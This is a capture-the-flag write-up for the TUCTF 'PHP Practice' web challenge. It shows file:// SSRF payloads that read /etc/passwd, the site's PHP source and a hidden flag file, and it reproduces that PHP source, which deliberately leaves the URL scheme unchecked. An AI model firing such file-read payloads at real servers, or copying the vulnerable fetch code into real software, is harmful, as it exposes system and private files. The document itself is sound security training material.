# PHP Practice

## Description
```
Have you ever seen an image on a website, and wished you could use the link to view it from a different domain? Me neither, but I needed web dev practice so I implemented it anyways! Give it a try -- Feed my site a link and it'll load your file!
```

## Writeup

Starting off I took a look at the website. (Sadly I didn't take many screenshots during CTF so I don't have any images) <br/>
I basically saw a Website which said I can display any other websites during their website. <br/>
To me this instantly sounded like a SSRF vulnerability so I tried it with a simple one. <br/>
```
file:///etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
app:x:1000:1000::/home/app:/usr/sbin/nologin
```

Getting this output I instantly knew I found the correct exploit. <br/>
Guessing the file path of the php page I also used SSRF to print it to the website. <br/>
```php
file:///var/www/html/display.php

<?php 

if ($_SERVER["REQUEST_METHOD"] == "POST") 
{ $link = $_POST["link"]; 
$validatedLink = filter_var($link, FILTER_VALIDATE_URL); 

if ($validatedLink) { // Fetch the content of the link 
$parsedUrl = parse_url($validatedLink); 
$host = $parsedUrl['host']; 
$ipv4Pattern = '/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/'; 

if (strtolower($host) == 'localhost') { 
echo("Invalid link. Please provide a valid external link."); 
exit(); } 

if (preg_match($ipv4Pattern, $host)) { 
echo("Error! Please avoid using IP addresses!"); 
exit(); } 

$content = @file_get_contents($validatedLink); 
$imageInfo = @getimagesize($validatedLink); 
if ($imageInfo !== false) { // If the content is an image, embed it in the HTML 

echo "<!DOCTYPE html> <html lang='en'> <head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> <title>Link Content Display</title> </head> <body> <h2>Content of the Link</h2> <img src='" . $validatedLink . "' alt='Embedded Image'> </body> </html>"; } 

else { // If the content is not an image, display it as plaintext

echo "<!DOCTYPE html> <html lang='en'> <head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> <title>Link Content Display</title> </head> <body> <h2>Content of the Link</h2> <p>" . htmlspecialchars($content) . "</p> </body> </html>"; } } 
else { 
echo("Invalid link provided."); } } 
else { // If the form is not submitted through POST, redirect to the form page 
header("Location: index.html"); 
exit(); } ?>
```

Now this didn't really give me any useful information and I didn't find a critical vulnerability in the code. <br/>
Continuing I tried to enumerate any useful file and finally found a common apache file `.htaccess`. <br/>
```
file:///var/www/html/.htaccess
```

I didn't save the actual output but it did include the file `gcfYAvzsbyxV.txt` and using SSRF I read the final file. <br/>
```
file:///var/www/html/gcfYAvzsbyxV.txt

TUCTF{th1s_i5_my_secr3t_l0c@l_f1le!}
```
